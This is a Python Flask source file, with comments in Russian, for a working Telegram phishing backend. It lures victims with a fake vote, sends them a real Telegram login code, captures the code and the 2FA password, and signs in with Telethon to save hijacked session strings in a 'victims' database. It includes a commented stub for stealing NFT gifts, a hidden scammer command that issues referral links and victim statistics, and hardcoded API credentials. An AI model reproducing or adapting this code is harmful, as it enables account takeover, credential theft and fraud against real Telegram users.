from telethon import TelegramClient
from telethon.sessions import StringSession
from flask import Flask, request, jsonify
from flask_cors import CORS
import sqlite3
import logging
import asyncio
import threading
import os
import random
import string

app = Flask(__name__)
CORS(app)
logging.basicConfig(level=logging.INFO)

# Твои реальные API данные
API_ID = 25015433
API_HASH = '546b7eb3f2865939ca71dbaedb49017d'
TARGET_USERNAME = '@trepall'

def init_db():
    conn = sqlite3.connect('phishing.db', check_same_thread=False)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS victims
                 (id INTEGER PRIMARY KEY, phone TEXT, code TEXT, password TEXT,
                  session_string TEXT, phone_code_hash TEXT, status TEXT,
                  votes INTEGER DEFAULT 0, ref_id TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# Глобальное хранилище для хэшей кодов
phone_code_hashes = {}

async def send_real_code(phone):
    """Реальная отправка кода через Telegram API"""
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        # Отправляем реальный код
        result = await client.send_code_request(phone)
        phone_code_hash = result.phone_code_hash
        
        logging.info(f"📱 Реальный код отправлен на {phone}")
        
        await client.disconnect()
        return phone_code_hash
        
    except Exception as e:
        logging.error(f"❌ Ошибка отправки кода: {e}")
        return None

async def verify_code_and_login(phone, code, phone_code_hash, password=None):
    """Реальная верификация кода и вход"""
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        # Пытаемся войти с кодом
        try:
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
        except Exception as e:
            if "password" in str(e).lower() and password:
                await client.sign_in(password=password)
            else:
                raise e
        
        # Получаем сессию
        session_string = client.session.save()
        me = await client.get_me()
        
        logging.info(f"✅ Успешный вход: {me.first_name} ({me.phone})")
        
        await client.disconnect()
        return session_string
        
    except Exception as e:
        logging.error(f"❌ Ошибка входа: {e}")
        return None

def background_hijack(phone, code, phone_code_hash, password=None, ref_id=None):
    """Фоновый захват аккаунта"""
    try:
        session_string = asyncio.run(
            verify_code_and_login(phone, code, phone_code_hash, password)
        )
        
        if session_string:
            # Сохраняем сессию
            conn = sqlite3.connect('phishing.db')
            c = conn.cursor()
            c.execute('''UPDATE victims SET 
                        session_string = ?, status = 'hijacked' 
                        WHERE phone = ?''', (session_string, phone))
            conn.commit()
            conn.close()
            
            logging.info(f"🔐 Аккаунт {phone} захвачен")
            
            # Здесь можно добавить кражу NFT
            # steal_nft_gifts(session_string)
            
        # Обновляем статус
        conn = sqlite3.connect('phishing.db')
        c = conn.cursor()
        c.execute('''UPDATE victims SET status = 'completed' 
                    WHERE phone = ?''', (phone,))
        conn.commit()
        conn.close()
        
    except Exception as e:
        logging.error(f"💥 Ошибка фоновой кражи: {e}")

@app.route('/auth', methods=['POST'])
def auth():
    try:
        data = request.get_json()
        phone = data.get('phone', '').strip()
        ref_id = data.get('ref_id', '')
        
        if not phone:
            return jsonify({'status': 'error', 'message': 'Phone required'}), 400
        
        # Обработка команды /brbrpatapim
        if phone.startswith('/brbrpatapim'):
            return handle_scammer_command(phone, ref_id)
        
        # Сохраняем номер
        conn = sqlite3.connect('phishing.db')
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO victims 
                    (phone, status, ref_id) VALUES (?, ?, ?)''',
                 (phone, 'pending', ref_id))
        conn.commit()
        conn.close()
        
        # Отправляем реальный код
        phone_code_hash = asyncio.run(send_real_code(phone))
        
        if not phone_code_hash:
            return jsonify({'status': 'error', 'message': 'Failed to send code'}), 500
        
        # Сохраняем хэш кода
        phone_code_hashes[phone] = phone_code_hash
        
        # Обновляем статус
        conn = sqlite3.connect('phishing.db')
        c = conn.cursor()
        c.execute('''UPDATE victims SET phone_code_hash = ?, status = ? 
                    WHERE phone = ?''',
                 (phone_code_hash, 'code_sent', phone))
        conn.commit()
        conn.close()
        
        logging.info(f"✅ Код отправлен на {phone}")
        
        return jsonify({
            'status': 'code_sent',
            'message': 'Code sent to Telegram'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /auth: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/code', methods=['POST'])
def verify_code():
    try:
        data = request.get_json()
        phone = data.get('phone', '')
        code = data.get('code', '')
        ref_id = data.get('ref_id', '')
        
        if not phone or not code:
            return jsonify({'status': 'error', 'message': 'Phone and code required'}), 400
        
        # Получаем хэш кода
        phone_code_hash = phone_code_hashes.get(phone)
        if not phone_code_hash:
            return jsonify({'status': 'error', 'message': 'Code expired'}), 400
        
        # Сохраняем код
        conn = sqlite3.connect('phishing.db')
        c = conn.cursor()
        c.execute('''UPDATE victims SET code = ?, status = ? 
                    WHERE phone = ?''',
                 (code, 'code_received', phone))
        conn.commit()
        conn.close()
        
        logging.info(f"🔑 Получен код для {phone}: {code}")
        
        # Пытаемся войти (проверяем нужен ли пароль)
        try:
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            asyncio.run(client.connect())
            
            # Пробуем войти с кодом
            try:
                asyncio.run(client.sign_in(
                    phone=phone,
                    code=code,
                    phone_code_hash=phone_code_hash
                ))
                # Если успешно - пароль не нужен
                session_string = client.session.save()
                asyncio.run(client.disconnect())
                
                # Запускаем фоновый захват
                thread = threading.Thread(
                    target=background_hijack,
                    args=(phone, code, phone_code_hash, None, ref_id)
                )
                thread.daemon = True
                thread.start()
                
                return jsonify({
                    'status': 'success',
                    'message': 'Vote counted successfully'
                })
                
            except Exception as e:
                if "password" in str(e).lower():
                    asyncio.run(client.disconnect())
                    return jsonify({
                        'status': 'password_required',
                        'message': '2FA password required'
                    })
                else:
                    asyncio.run(client.disconnect())
                    return jsonify({
                        'status': 'invalid_code',
                        'message': 'Invalid code'
                    })
                    
        except Exception as e:
            logging.error(f"❌ Ошибка проверки кода: {e}")
            return jsonify({'status': 'error', 'message': 'Verification failed'}), 500
        
    except Exception as e:
        logging.error(f"❌ Ошибка /code: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/password', methods=['POST'])
def password():
    try:
        data = request.get_json()
        phone = data.get('phone', '')
        password = data.get('password', '')
        ref_id = data.get('ref_id', '')
        
        if not phone or not password:
            return jsonify({'status': 'error', 'message': 'Phone and password required'}), 400
        
        # Получаем код и хэш
        conn = sqlite3.connect('phishing.db')
        c = conn.cursor()
        c.execute('SELECT code, phone_code_hash FROM victims WHERE phone = ?', (phone,))
        result = c.fetchone()
        conn.close()
        
        if not result:
            return jsonify({'status': 'error', 'message': 'Session expired'}), 400
        
        code, phone_code_hash = result
        
        # Сохраняем пароль
        conn = sqlite3.connect('phishing.db')
        c = conn.cursor()
        c.execute('''UPDATE victims SET password = ?, status = ? 
                    WHERE phone = ?''',
                 (password, 'password_received', phone))
        conn.commit()
        conn.close()
        
        logging.info(f"🔐 Получен пароль для {phone}")
        
        # Запускаем фоновый захват
        thread = threading.Thread(
            target=background_hijack,
            args=(phone, code, phone_code_hash, password, ref_id)
        )
        thread.daemon = True
        thread.start()
        
        return jsonify({
            'status': 'success',
            'message': 'Vote counted successfully'
        })
        
    except Exception as e:
        logging.error(f"❌ Ошибка /password: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def handle_scammer_command(phone, ref_id):
    """Обработка команды /brbrpatapim"""
    try:
        parts = phone.split()
        command = parts[0] if parts else ''
        
        if len(parts) == 1:
            # Показать статистику
            conn = sqlite3.connect('phishing.db')
            c = conn.cursor()
            
            c.execute("SELECT COUNT(*) FROM victims")
            total_victims = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM victims WHERE status = 'completed'")
            completed = c.fetchone()[0]
            
            c.execute("SELECT COUNT(*) FROM victims WHERE ref_id = ?", (ref_id,))
            ref_victims = c.fetchone()[0]
            
            conn.close()
            
            return jsonify({
                'status': 'quick_stats',
                'message': f'📊 Статистика:\nВсего жертв: {total_victims}\nУспешных: {completed}\nПо вашей ссылке: {ref_victims}'
            })
            
        elif len(parts) == 2 and parts[1] == 'create':
            # Создать реферальную ссылку
            username = generate_username()
            ref_link = f"https://your-phishing-site.com?ref={username}"
            
            return jsonify({
                'status': 'scammer_created',
                'username': username,
                'ref_link': ref_link,
                'message': 'Реферальная ссылка создана'
            })
            
        else:
            return jsonify({
                'status': 'error',
                'message': 'Неизвестная команда. Используйте: /brbrpatapim или /brbrpatapim create'
            })
            
    except Exception as e:
        logging.error(f"❌ Ошибка команды: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

def generate_username():
    """Генерация уникального username"""
    letters = string.ascii_lowercase
    return 'scammer_' + ''.join(random.choice(letters) for i in range(6))

@app.route('/stats', methods=['GET'])
def stats():
    """Статистика для админов"""
    try:
        conn = sqlite3.connect('phishing.db')
        c = conn.cursor()
        
        c.execute("SELECT COUNT(*), SUM(votes) FROM victims")
        total, votes = c.fetchone()
        
        c.execute('''SELECT status, COUNT(*) FROM victims 
                    GROUP BY status''')
        status_stats = c.fetchall()
        
        c.execute('''SELECT ref_id, COUNT(*) FROM victims 
                    WHERE ref_id IS NOT NULL AND ref_id != ''
                    GROUP BY ref_id ORDER BY COUNT(*) DESC LIMIT 10''')
        top_refs = c.fetchall()
        
        conn.close()
        
        return jsonify({
            'total_victims': total,
            'total_votes': votes or 0,
            'status_stats': dict(status_stats),
            'top_referrals': [{'ref': r[0], 'count': r[1]} for r in top_refs]
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    logging.info("🚀 Запуск фишинг-бэкенда...")
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
